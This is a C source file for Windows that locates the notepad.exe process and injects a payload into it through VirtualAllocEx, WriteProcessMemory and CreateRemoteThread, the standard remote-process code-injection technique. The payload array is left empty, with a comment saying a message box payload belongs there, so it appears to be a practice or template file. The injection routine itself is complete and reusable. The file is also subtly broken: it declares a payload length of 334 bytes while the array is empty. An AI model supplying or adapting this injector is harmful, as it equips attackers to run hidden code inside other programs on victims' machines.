#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

unsigned char payload[] = ""; // message box pyalod needs to come here.
unsigned int payload_len = 334;

int findTarget(const char *procname) { 
	HANDLE hProcSnap;
	PROCESSENTRY32 pe32;
	int pid = 0;

	hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hProcSnap) {
		return 0;
	}

	pe32.dwSize = sizeof(PROCESSENTRY32);
	
	if (!Process32First(hProcSnap, &pe32)) {
		CloseHandle(hProcSnap);
		return 0;
	}

	while(Process32Next(hProcSnap, &pe32)){
		if (lstrcmpiA(procname, (LPSTR) pe32.szExeFile) == 0) {
			pid = pe32.th32ProcessID;
			break;
		}
	}

	CloseHandle(hProcSnap);
	return pid; 
}

int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

	// I wanna die
	LPVOID pRemoteCode = NULL;
	HANDLE hThread = NULL;

	pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T*)NULL);

	hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE) pRemoteCode, NULL, 0, NULL);
	if (hThread != NULL) {
		WaitForSingleObject(hThread, 500);
		CloseHandle(hThread);
		return 0;
	}

	return -1;
}



int main() {
	int pid = 0;
	HANDLE hProc = NULL;
	pid = findTarget("notepad.exe");

	if (pid) {
		printf("Notepad.exe PID = %d\n", pid);

		hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD)pid);

		if (hProc != NULL) {
			Inject(hProc, payload, payload_len);
			CloseHandle(hProc);
		}
	}
}